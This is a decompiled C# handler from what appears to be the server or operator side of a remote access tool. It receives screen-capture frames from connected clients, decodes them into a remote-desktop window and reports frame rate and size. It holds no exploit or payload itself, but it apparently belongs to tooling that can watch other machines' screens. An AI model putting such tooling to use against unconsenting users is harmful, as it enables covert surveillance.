using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.Helper;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000051 RID: 81
	public class HandleRemoteDesktop
	{
		// Token: 0x060001CB RID: 459 RVA: 0x00010E94 File Offset: 0x0000F094
		public void Capture(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				FormRemoteDesktop formRemoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
				try
				{
					if (formRemoteDesktop != null)
					{
						if (formRemoteDesktop.Client == null)
						{
							formRemoteDesktop.Client = client;
							formRemoteDesktop.labelWait.Visible = false;
							formRemoteDesktop.timer1.Start();
							unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
							int num = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
							formRemoteDesktop.numericUpDown2.Maximum = num - 1;
						}
						byte[] asBytes = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
						object syncPicbox = formRemoteDesktop.syncPicbox;
						lock (syncPicbox)
						{
							using (MemoryStream memoryStream = new MemoryStream(asBytes))
							{
								formRemoteDesktop.GetImage = formRemoteDesktop.decoder.DecodeData(memoryStream);
							}
							formRemoteDesktop.pictureBox1.Image = formRemoteDesktop.GetImage;
							formRemoteDesktop.FPS++;
							if (formRemoteDesktop.sw.ElapsedMilliseconds >= 1000L)
							{
								Control control = formRemoteDesktop;
								string[] array = new string[10];
								array[0] = "RemoteDesktop:";
								array[1] = client.ID;
								array[2] = "    FPS:";
								int num2 = 3;
								int fps = formRemoteDesktop.FPS;
								array[num2] = fps.ToString();
								array[4] = "    Screen:";
								array[5] = formRemoteDesktop.GetImage.Width.ToString();
								array[6] = " x ";
								array[7] = formRemoteDesktop.GetImage.Height.ToString();
								array[8] = "    Size:";
								array[9] = Methods.BytesToString((long)asBytes.Length);
								control.Text = string.Concat(array);
								formRemoteDesktop.FPS = 0;
								formRemoteDesktop.sw = Stopwatch.StartNew();
							}
							goto IL_1CE;
						}
						goto IL_1C6;
						IL_1CE:
						goto IL_1D3;
					}
					IL_1C6:
					client.Disconnected();
				}
				catch (Exception)
				{
				}
				IL_1D3:;
			}
			catch
			{
			}
		}
	}
}
